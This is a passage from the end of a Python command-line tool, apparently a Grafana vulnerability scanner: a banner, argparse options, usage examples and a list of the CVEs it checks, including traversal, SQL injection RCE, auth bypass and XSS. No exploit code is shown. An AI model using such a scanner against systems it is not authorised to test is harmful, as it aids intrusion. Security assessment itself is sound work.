║  {Colors.BOLD}░██████╗░██████╗░░█████╗░███████╗░█████╗░███╗░░██╗░█████╗░                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██╔════╝░██╔══██╗██╔══██╗██╔════╝██╔══██╗████╗░██║██╔══██╗                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██║░░██╗░██████╔╝███████║█████╗░░███████║██╔██╗██║███████║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}██║░░╚██╗██╔══██╗██╔══██║██╔══╝░░██╔══██║██║╚████║██╔══██║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}╚██████╔╝██║░░██║██║░░██║██║Ziad░██║░░██║██║░╚███║██║░░██║                {Colors.RESET}{Colors.CRITICAL} ║
║  {Colors.BOLD}░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝                {Colors.RESET}{Colors.CRITICAL} ║
║                                                                                                                         ║
║                                                                                                                         ║
║  {Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}{Colors.CRITICAL} ║
╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def main():
    """Main execution flow"""
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='Grafana Final Scanner - Professional Vulnerability Assessment Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.BOLD}USAGE EXAMPLES:{Colors.RESET}
  {sys.argv[0]} -u https://grafana.target.com
  {sys.argv[0]} -f targets.txt -o report.json
  {sys.argv[0]} -u https://grafana.internal.local --no-ssl-verify -v

{Colors.BOLD}TESTED VULNERABILITIES:{Colors.RESET}
  {Colors.CRITICAL}CRITICAL:{Colors.RESET}
    • CVE-2025-4123 - Path Traversal & Open Redirect XSS
    • CVE-2024-9264 - DuckDB SQL Injection (RCE)
    • CVE-2021-43798 - Directory Traversal (Arbitrary File Read)

  {Colors.HIGH}HIGH:{Colors.RESET}
    • CVE-2018-15727 - Authentication Bypass (Cookie Forging)
    • CVE-2021-27358 - DoS via Snapshots API

  {Colors.MEDIUM}MEDIUM:{Colors.RESET}
    • CVE-2020-11110 - Stored XSS
    • CVE-2021-41174 - AngularJS XSS
    • CVE-2021-39226 - Snapshot Enumeration

{Colors.BOLD}FEATURES:{Colors.RESET}
  • Multi-source version detection
  • Version-aware vulnerability filtering
  • Configuration security analysis
  • Comprehensive JSON reporting
  • Color-coded severity indicators

{Colors.DIM}For more information, see README.md{Colors.RESET}
        '''
    )
    
    parser.add_argument('-u', '--url', help='Single target URL to scan')
    parser.add_argument('-f', '--file', help='File containing list of targets (one per line)')
    parser.add_argument('-o', '--output', help='Save detailed JSON report to file')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='HTTP request timeout in seconds (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output (show all checks)')
    
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner
    scanner = GrafanaFinalScanner(
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify,
        verbose=args.verbose
    )
    
    # Execute scan
    results = []
    
    try:
        if args.url:
            result = scanner.scan_target(args.url)
            results.append(result)
        
        if args.file:
            results.extend(scanner.scan_from_file(args.file))
        
        # Generate report
        scanner.generate_report(results, args.output)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARN}[!] Scan interrupted by user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.CRITICAL}[!] Fatal error: {str(e)}{Colors.RESET}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
